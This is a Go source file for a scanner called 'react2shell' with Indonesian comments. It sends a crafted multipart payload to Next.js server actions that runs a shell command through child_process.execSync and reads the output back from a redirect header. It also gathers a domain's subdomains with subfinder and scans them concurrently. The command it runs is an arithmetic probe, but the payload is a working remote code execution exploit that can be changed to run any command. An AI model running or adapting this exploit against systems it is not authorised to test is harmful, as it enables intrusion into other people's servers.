package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

const (
	Red    = "\033[91m"
	Green  = "\033[92m"
	Yellow = "\033[93m"
	Cyan   = "\033[96m"
	Bold   = "\033[1m"
	Reset  = "\033[0m"
)

type Result struct {
	Host       string
	Vulnerable bool
	StatusCode int
	Error      string
}

var client *http.Client

// Fungsi payload dengan perbaikan backtick (\x60) untuk akurasi RCE
func buildRCEPayload(windows bool) (string, string) {
	boundary := "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
	cmd := "echo $((41*271))"
	if windows {
		cmd = `powershell -c \"41*271\"`
	}

	// \x60 adalah karakter backtick (`) yang diperlukan oleh sinkronisasi Next.js
	prefix := fmt.Sprintf("var res=process.mainModule.require('child_process').execSync('%s').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: \x60NEXT_REDIRECT;push;/login?a=${res};307;\x60});", cmd)
	part0 := fmt.Sprintf(`{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"%s","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`, prefix)

	body := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n--%s\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n--%s--", boundary, part0, boundary, boundary, boundary)
	return body, "multipart/form-data; boundary=" + boundary
}

func checkVulnerability(target string) Result {
	if !strings.HasPrefix(target, "http") {
		target = "https://" + target
	}
	res := Result{Host: target}

	body, ctype := buildRCEPayload(false)
	req, err := http.NewRequest("POST", target, strings.NewReader(body))
	if err != nil {
		res.Error = err.Error()
		return res
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Assetnote Scanner)")
	req.Header.Set("Next-Action", "x")
	req.Header.Set("Content-Type", ctype)
	req.Header.Set("X-Nextjs-Request-Id", "b5dce965")

	resp, err := client.Do(req)
	if err != nil {
		res.Error = err.Error()
		return res
	}
	defer resp.Body.Close()

	res.StatusCode = resp.StatusCode
	val := resp.Header.Get("X-Action-Redirect")
	
	// Jika header mengandung hasil kalkulasi 11111, berarti RCE sukses
	if strings.Contains(val, "a=11111") {
		res.Vulnerable = true
	}
	return res
}

func main() {
	targetURL := flag.String("u", "", "Target URL or Domain")
	listPath := flag.String("l", "", "Path to list of hosts")
	threads := flag.Int("threads", 20, "Number of concurrent workers")
	flag.Parse()

	if *targetURL == "" && *listPath == "" {
		fmt.Println("Usage: ./react2shell -u domain.com")
		return
	}

	client = &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	var hosts []string
	if *targetURL != "" {
		domain := *targetURL
		if strings.Contains(domain, "//") {
			parsed, _ := url.Parse(domain)
			domain = parsed.Hostname()
		}
		
		fmt.Printf(Cyan+"[*] Running Subfinder for: %s...\n"+Reset, domain)
		out, err := exec.Command("subfinder", "-d", domain, "-silent").Output()
		if err == nil {
			subs := strings.Split(strings.TrimSpace(string(out)), "\n")
			for _, s := range subs {
				if s != "" {
					hosts = append(hosts, s)
				}
			}
		}
		hosts = append(hosts, *targetURL) // Masukkan target original ke list
	} else if *listPath != "" {
		dat, _ := os.ReadFile(*listPath)
		hosts = strings.Split(string(dat), "\n")
	}

	fmt.Printf(Cyan+"[*] Starting scan on %d hosts with %d threads...\n\n"+Reset, len(hosts), *threads)

	var wg sync.WaitGroup
	jobChan := make(chan string, len(hosts))

	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for h := range jobChan {
				h = strings.TrimSpace(h)
				if h == "" { continue }
				res := checkVulnerability(h)
				if res.Vulnerable {
					fmt.Printf("%s %s (Status: %d)\n", Bold+Red+"[VULNERABLE]"+Reset, res.Host, res.StatusCode)
				} else if res.Error == "" {
					fmt.Printf("%s %s\n", Green+"[SAFE]"+Reset, res.Host)
				}
			}
		}()
	}

	for _, h := range hosts {
		jobChan <- h
	}
	close(jobChan)
	wg.Wait()
}
